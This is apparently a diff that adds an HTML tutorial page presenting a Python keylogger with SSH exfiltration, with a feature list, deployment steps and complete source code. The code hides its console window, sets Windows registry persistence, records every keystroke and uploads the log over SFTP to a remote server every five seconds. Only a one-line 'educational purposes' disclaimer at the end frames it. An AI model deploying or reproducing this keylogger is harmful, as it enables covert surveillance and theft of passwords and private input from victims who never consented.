@@ -1,1 +1,448 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger - Angel Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: #000000;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #1a1a1a;
+        }
+
+        .back-button {
+            display: inline-block;
+            background-color: #dc143c;
+            color: #ffffff;
+            padding: 10px 25px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .back-button:hover {
+            background-color: #b01030;
+        }
+
+        .page-title {
+            font-size: 2.5em;
+            font-weight: 300;
+            letter-spacing: 3px;
+            margin-top: 10px;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        h3 {
+            color: #dc143c;
+            font-size: 1.5em;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .explanation {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #dc143c;
+        }
+
+        .explanation p {
+            margin-bottom: 15px;
+            font-size: 1.05em;
+            line-height: 1.8;
+        }
+
+        .explanation ul {
+            margin-left: 30px;
+            margin-bottom: 15px;
+        }
+
+        .explanation li {
+            margin-bottom: 10px;
+            font-size: 1.05em;
+        }
+
+        .code-section {
+            margin-bottom: 40px;
+        }
+
+        .code-label {
+            color: #ffffff;
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 30px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+
+        .inline-code {
+            background-color: #1a1a1a;
+            color: #ce9178;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+
+        .feature-list {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border-left: 4px solid #dc143c;
+        }
+
+        .feature-list h4 {
+            color: #dc143c;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        .warning-box {
+            background-color: #4a1a1a;
+            border-left: 4px solid #ff0000;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box strong {
+            color: #ff0000;
+            font-size: 1.2em;
+        }
+
+        .flow-diagram {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 30px 0;
+            border: 1px solid #333333;
+        }
+
+        .flow-step {
+            background-color: #000000;
+            border: 2px solid #dc143c;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .flow-step::after {
+            content: "↓";
+            display: block;
+            text-align: center;
+            color: #dc143c;
+            font-size: 2em;
+            margin-top: 10px;
+        }
+
+        .flow-step:last-child::after {
+            content: "";
+        }
+
+        .flow-step h4 {
+            color: #dc143c;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="../index.html" class="back-button">← Back to Home</a>
+        <div class="page-title">Python Keylogger with SSH Exfiltration</div>
+    </div>
+
+    <div class="container">
+        
+
+        <h3>Overview</h3>
+
+        <div class="explanation">
+            <p>A sophisticated Python-based keylogger that captures all keyboard input, stores it locally, and automatically exfiltrates the data to a remote SSH server. The keylogger includes persistence mechanisms to survive system reboots and runs silently in the background without visible windows.</p>
+        </div>
+
+        <div class="feature-list">
+            <h4>Features</h4>
+            <ul>
+                <li><strong>Keystroke Capture</strong> - Records all keyboard input including special keys</li>
+                <li><strong>Automatic Data Exfiltration</strong> - Sends captured data to remote SSH server every 5 seconds</li>
+                <li><strong>Startup Persistence</strong> - Automatically adds itself to Windows startup registry</li>
+                <li><strong>Local Backup</strong> - Maintains local log file in case of connection failure</li>
+                <li><strong>Graceful Shutdown</strong> - Saves final keystroke buffer even during forced termination</li>
+                <li><strong>Threading</strong> - Maintains separate threads for logging and file transfer</li>
+            </ul>
+        </div>
+
+        <h3>How It Works</h3>
+
+        <div class="flow-diagram">
+            <div class="flow-step">
+                <h4>1. Initial Execution</h4>
+                <p>Program starts and immediately hides the console window to avoid detection</p>
+            </div>
+            <div class="flow-step">
+                <h4>2. Persistence Setup</h4>
+                <p>Adds itself to Windows Registry startup key: <span class="inline-code">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></p>
+            </div>
+            <div class="flow-step">
+                <h4>3. Keystroke Monitoring</h4>
+                <p>Hooks into keyboard events using the <span class="inline-code">keyboard</span> library to capture all keystrokes</p>
+            </div>
+            <div class="flow-step">
+                <h4>4. Local Logging</h4>
+                <p>Writes captured keystrokes to local file, handling special keys (Space, Enter, Backspace)</p>
+            </div>
+            <div class="flow-step">
+                <h4>5. Data Exfiltration</h4>
+                <p>Background thread uploads log file to remote SSH server every 5 seconds via SFTP</p>
+            </div>
+            <div class="flow-step">
+                <h4>6. Continuous Operation</h4>
+                <p>Repeats steps 3-5 indefinitely until system shutdown or manual termination</p>
+            </div>
+        </div>
+
+        <h3>Configuration</h3>
+
+        <div class="explanation">
+            <p>Before deployment, configure the following variables in the script:</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Configuration Variables</span>
+            <pre><code class="language-python"># Local file path where keystrokes are stored
+keylogger_file = "C:\\Users\\Public\\Documents\\system.log"
+
+# SSH server credentials for data exfiltration
+ssh_host = "your.server.com"
+ssh_port = "22"
+ssh_username = "your_username"
+ssh_password = "your_password"
+
+# Local file path (must match keylogger_file)
+local_file_path = "C:\\Users\\Public\\Documents\\system.log"
+
+# Remote destination on SSH server
+remote_file_path = "/home/username/logs/system.log"</code></pre>
+        </div>
+
+
+        <h3>Deployment</h3>
+
+        <div class="code-section">
+            <span class="code-label">Run the Keylogger</span>
+            <pre><code class="language-bash"># direct execution (console will hide automatically)
+python keylogger.py
+
+# or compile to executable 
+pyinstaller --onefile --noconsole keylogger.py</code></pre>
+        </div>
+
+        <h3>Technical Implementation</h3>
+
+        <div class="explanation">
+            <p><strong>Keystroke Capture Logic:</strong></p>
+            <p>The keylogger uses event-driven programming to capture keystrokes:</p>
+            <ul>
+                <li><strong>Space Key:</strong> Writes the current word buffer followed by a space</li>
+                <li><strong>Enter Key:</strong> Writes the current word buffer followed by a newline</li>
+                <li><strong>Backspace Key:</strong> Removes the last character from the word buffer</li>
+                <li><strong>Printable Keys:</strong> Appends the character to the current word buffer</li>
+            </ul>
+
+            <p><strong>Persistence Mechanism:</strong></p>
+            <p>The program modifies the Windows Registry to ensure it runs on every system startup:</p>
+            <ul>
+                <li>Opens: <span class="inline-code">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></li>
+                <li>Creates entry with script name as key and full path as value</li>
+                <li>Runs silently on every user login</li>
+            </ul>
+
+            <p><strong>Data Exfiltration:</strong></p>
+            <p>A separate daemon thread continuously attempts to upload the log file:</p>
+            <ul>
+                <li>Runs every 5 seconds in background</li>
+                <li>Uses SSH/SFTP for secure, encrypted transfer</li>
+                <li>Continues logging even if upload fails</li>
+                <li>Automatic reconnection on network restoration</li>
+            </ul>
+        </div>
+
+        
+
+        <h3>Full Source Code</h3>
+
+        <div class="code-section">
+            <span class="code-label">Python Code</span>
+            <pre><code class="language-python">import time
+import atexit
+import keyboard
+import threading
+import paramiko
+import winreg
+import os
+import sys
+import win32gui
+import win32con
+
+keylogger_file = ""
+#keep this var empty
+word = ""
+
+ssh_host = ""
+ssh_port = ""
+ssh_username = ""
+ssh_password = ""
+
+#location of file in local machine
+local_file_path = ""
+
+#location of file in ssh server
+remote_file_path = ""
+
+#capture keystokes
+def on_keys_press(event):
+    global word
+    with open(keylogger_file, 'a') as f:
+        if event.name == 'space':
+            f.write(word+" ")
+            word=""
+        elif event.name == 'enter':
+            f.write(word+"\n")
+            word=""
+        #erase when user erases
+        elif event.name == 'backspace':
+            word = word[:-1]
+        #get key no matter what key
+        elif len(event.name) == 1 and event.name.isprintable():
+            word+=event.name
+
+#even if user CTRL+C it will save last word
+def get_last_word():
+    global word
+    if word:
+        with open(keylogger_file, 'a') as f:
+            f.write(word)
+
+def send_file(host,port,username,password,local_file_path,remote_file_path):
+    #opens ssh connection
+    while True:
+        #time
+        time.sleep(5)
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(hostname=host,port=port,username=username,password=password)
+            
+            #creates sftp to upload the file
+            sftp = ssh.open_sftp()
+            sftp.put(local_file_path, remote_file_path)
+            
+            #closes connection
+            sftp.close()
+            ssh.close()
+        except:
+            pass
+
+def add_to_startup():
+    try:
+        # get path of script
+        script_path = os.path.abspath(sys.argv[0])
+        
+        # open the registry key for startup programs
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            "Software\\Microsoft\Windows\\CurrentVersion\\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        
+        # Add the program to startup
+        winreg.SetValueEx(key, sys.argv[0], 0, winreg.REG_SZ, script_path)
+        winreg.CloseKey(key)
+        return True
+    except Exception as e:
+        return False
+
+def main():
+    # hide console window pop up
+    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+    
+    # add to startup if not already there
+    add_to_startup()
+    
+    atexit.register(get_last_word)
+    
+    while True:
+        threading.Thread(target=send_file, args=(ssh_host, ssh_port, ssh_username, ssh_password, local_file_path, remote_file_path), daemon=True).start()
+        try:
+            keyboard.on_press(on_keys_press)
+            keyboard.wait()
+        except KeyboardInterrupt:
+            get_last_word()
+
+if __name__ == "__main__":
+    main()</code></pre>
+        </div>
+
+        
+
+      
+        
+        <h3>Note</h3>
+
+        <div class="explanation">
+            <ul>
+                <li>Requires administrator privileges for registry modification</li>
+                <li>SSH credentials stored in plaintext in script</li>
+                <li>Network connectivity required for data exfiltration</li>
+              <li>For educational purposes in isolated lab environments</li>
+            </ul>
+        </div>
+
+    </div>
+
+    <script>
+        hljs.highlightAll();
+    </script>
+</body>
+</html>
